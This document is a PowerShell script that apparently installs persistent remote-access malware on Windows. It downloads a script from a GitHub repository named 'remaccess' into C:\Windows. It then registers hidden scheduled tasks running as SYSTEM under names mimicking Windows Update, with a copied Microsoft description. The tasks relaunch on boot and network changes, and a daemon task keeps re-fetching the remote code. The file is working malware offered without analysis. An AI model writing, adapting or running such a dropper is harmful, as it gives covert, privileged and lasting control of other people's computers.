# Prompt the user for the values
$code = Read-Host "Enter the code"
# Define the registry path
$regPath = "HKLM:\Software\WindowsUpdateService"
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force
}
#Install Daemon Service
$scriptContent = @'
$url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/access-control"
$localFilePath = "C:\Windows\WindowsUpdateService.ps1"
$response = Invoke-WebRequest -Uri $url
if ($response.StatusCode -eq 200) {
    $response.Content | Set-Content -Path $localFilePath -Force
} else {}
'@
$targetFilePath = "C:\Windows\WindowsUpdateServiceDaemon.ps1"
Remove-Item $targetFilePath -Force -ErrorAction SilentlyContinue
$scriptContent | Set-Content -Path $targetFilePath -Force
# Set the values in the Registry
Set-ItemProperty -Path $regPath -Name "Code" -Value $code
Set-ItemProperty -Path $regPath -Name "Data" -Value active
$url = "https://github.com/DirNotAvailable/remaccess/raw/main/access-control"
$outputPath = "C:\Windows\WindowsUpdateService.ps1"
Remove-Item $outputPath -Force -ErrorAction SilentlyContinue
# Download the content from the URL and save it to the specified file
Invoke-WebRequest -Uri $url -OutFile $outputPath
$updateservxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T00:56:52.6271595</Date>
    <Author>System\User</Author>
    <URI>\Windows Update Service</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT15M</Delay>
    </BootTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>C:/Windows/WindowsUpdateService.ps1</Arguments>
    </Exec>
  </Actions>
</Task>
"@
# Register the task from the XML content
$updateserv = "Windows Update Service"
if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
    # Task exists, so delete it
    Unregister-ScheduledTask -TaskName $updateserv -Confirm:$false
    Write-Host "Task '$updateserv' deleted."
} else {}
Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv
Start-ScheduledTask -TaskName $updateserv
#Task Creation for Daemon Service
$daemonxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T20:52:57.307232</Date>
    <Author>System\User</Author>
    <Description>Windows Server Update Services, previously known as Software Update Services, is a computer program and network service developed by Microsoft Corporation that enables administrators to manage the distribution of updates and hotfixes released for Microsoft products to computers in a corporate environment.</Description>
    <URI>\Windows Update Service Daemon</URI>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Repetition>
        <Interval>PT18M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT8M</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Queue</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT17M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>C:/Windows/WindowsUpdateServiceDaemon.ps1</Arguments>
    </Exec>
  </Actions>
</Task>
"@
$daemonserv = "Windows Update Service Daemon"
if (Get-ScheduledTask -TaskName $daemonserv -ErrorAction SilentlyContinue) {
    # Task exists, so delete it
    Unregister-ScheduledTask -TaskName $daemonserv -Confirm:$false
    Write-Host "Task '$daemonserv' deleted."
} else {}
Register-ScheduledTask -Xml $daemonxml -TaskName $daemonserv
Start-ScheduledTask -TaskName $daemonserv
